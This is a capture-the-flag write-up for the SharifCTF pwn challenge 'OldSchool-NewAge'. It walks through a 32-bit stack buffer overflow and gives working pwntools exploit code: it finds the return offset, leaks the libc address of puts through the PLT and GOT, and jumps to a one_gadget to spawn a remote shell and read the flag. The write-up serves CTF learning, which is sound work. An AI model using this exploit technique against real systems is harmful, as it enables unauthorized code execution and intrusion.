OldSchool-NewAge
===

**Category:** Pwn, **Points:** 75, **Solves:** 108, **Rank:** 17

> It all started with a leak bang
>
> nc ctf.sharif.edu 4801 
>
> Alternative: nc 213.233.161.38 4801

### Write-up

We are given linux 32bit ELF executable and `libc.so` used on remote server.

```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Luckily for us, the executable is **not** position independent, so we know its `main` addresss, there is also no [canary](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries) to protect against [stack smashing](https://en.wikipedia.org/wiki/Stack_buffer_overflow). The only problem we might have is [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)on server, as the program suggests: "This time it is randomized...".

There is no source code, but luckily the application is simple enough to decompile it by any decompiler. It is [retdec](https://retdec.com/decompilation-run/) output:

```
// Address range: 0x80484cb - 0x80484e9
char* copy_it(char* str2) {
    char str[??];
    strcpy(str, str2);
    return NULL;
}

// Address range: 0x80484ea - 0x804857f
int main(int argc, char** argv) {
    puts("This time it is randomized...");
    puts("You should find puts yourself");
    fflush(stdin);
    char str[??];
    fgets(str, 200, stdin);
    copy_it(str);
    puts("done!");
    return 0;
}
```

Aww, it looks like the classic buffer overflow vulnerability. Buffer length might me estimated with accuracy of compiler variables alignment, but it is not really necessary here, as we can simply send long payload and see what happens. There is no canary so we can easily send long message to replace old return address with a new one - for example to `execve` from `libc` to run `/bin/sh` app. Let's first see if there is really vulnerability. 

```
from pwn import *

p = gdb.debug("./vuln4", "continue")

p.sendline(cyclic(200))

```

We have used here great python library `pwntools`. It starts application under gdb and sends long line to it.

```
Program received signal SIGSEGV, Segmentation fault.
0x61676161 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[──────────────────────────────────REGISTERS───────────────────────────────────]
 EAX  0x0
 EBX  0x0
*ECX  0xffc49cc0 ◂— 'abyaa'
*EDX  0xffc49c88 ◂— 'abyaa'
*EDI  0xf76f2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b5db0
*ESI  0x1
*EBP  0x61666161 ('aafa')
*ESP  0xffc49be0 ◂— 0x61686161 ('aaha')
*EIP  0x61676161 ('aaga')
[────────────────────────────────────DISASM────────────────────────────────────]
Invalid address 0x61676161

[────────────────────────────────────STACK─────────────────────────────────────]
00:0000│ esp  0xffc49be0 ◂— 0x61686161 ('aaha')
01:0004│      0xffc49be4 ◂— 0x61696161 ('aaia')
02:0008│      0xffc49be8 ◂— 0x616a6161 ('aaja')
03:000c│      0xffc49bec ◂— 0x616b6161 ('aaka')
04:0010│      0xffc49bf0 ◂— 0x616c6161 ('aala')
05:0014│      0xffc49bf4 ◂— 0x616d6161 ('aama')
06:0018│      0xffc49bf8 ◂— 0x616e6161 ('aana')
07:001c│      0xffc49bfc ◂— 0x616f6161 ('aaoa')
[──────────────────────────────────BACKTRACE───────────────────────────────────]
 ► f 0 61676161
   f 1 61686161
   f 2 61696161
   f 3 616a6161
   f 4 616b6161
   f 5 616c6161
   f 6 616d6161
   f 7 616e6161
   f 8 616f6161
   f 9 61706161
   f 10 61716161
Program received signal SIGSEGV (fault address 0x61676161)
pwndbg> 
```

Program crashed as we wanted - it wanted to jump to address `0x61676161` which is incorrect one, let's see at which offset there is return address:

```
>>> from pwn import *
>>> cyclic(200).find(p32(0x61676161))
22
```

That means we must put 22 bytes of junk, then new return address and the rest arguments. Now we must overcome ASLR. The tip is in program message: _"You should find puts yourself"_. We can exploit [GOT and PLT](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html). The executable is `dynamically linked`:

```
$ file vuln4
vuln4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2da0205021e2719e0e6feb17a4e571dca715
558c, not stripped
```

That means when we call some standard c library function, function from system `libc` is executed, but of course at the time of compilation, we don't know at which address functions will be at the time of execution, executable has to somehow find the address of desired function. Here comes GOT & PLT mechanism. All calls to `puts` are calls to function:

```
> disass puts@plt
0x080483A0: jmp     DWORD PTR ds:0x8049874
0x080483A6: push    0x18
0x080483AB: jmp     0x8048360
```

For the first time under address `0x8049874` there is address to next instruction (`push`), then it jumps to another function to fill memory under address `0x8049874` with actual address of desired function - `puts`. You can read more about [PLT and GOT here](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html).

To leak radomized by ASLR `libc` address, we are going to jump to `puts@plt` with argument `puts@got` so that it prints **actual** address of `puts` in `libc` (and then we return again to main).

```
from pwn import *

p = remote("ctf.sharif.edu", "4801")

pelf = ELF("vuln4")
puts_plt = pelf.symbols['plt.puts']
puts_got = pelf.symbols['got.puts']

payload = 22 * 'a'
payload += p32(puts_plt)
payload += p32(pelf.symbols['main'])
payload += p32(puts_got)

p.readline()
p.readline()

p.sendline(payload)
puts = u32(p.read(4))
print "libc puts: " + hex(puts)
p.clean()
```

Luckily authors gave us whole `libc` running on server, so there is no need to guess version of it and we can directly find out at which offset there is `puts` in this `libc`, in order to compute at which offset there is desired function (e.g. `execve`):

```
elf = ELF("libc.so.6")
base = puts - elf.symbols['puts']
print "libc base: " + hex(base)
```

`fgets` is really nice function and it accepts almost everything, but `strcpy` which is later used on read string stops once it meets byte `0x0` and we need this value to call `execve("/bin/sh", NULL, NULL)`. We might constuct simple rop chain, or... find place in `libc` which calls directly `execve("/bin/sh", NULL, NULL)`! There is handy tool [one gadget](https://github.com/david942j/one_gadget), which can find calls to execve /bin/sh in libc.

``` 
$ one_gadget ./libc.so.6
0x3ac5c    execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac5e    execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac62    execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac69    execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbc5    execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbc6    execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
```

There are plenty of `execve /bin/sh`, all of them requires some special conditions but luckily conditions for call at offset `0x5fbc5` are met in our case, so we can jump to `base + 0x5fbc5` to start `/bin/sh`.

```
payload = 22 * 'a' + p32(base + 0x5fbc5)
p.sendline(payload)
p.interactive()
$ cat /home/ctfuser/flag
SharifCTF{7af9dab81dff481772609b97492d6899}
```

###### Mucosolvan & Bartek aka bandysc 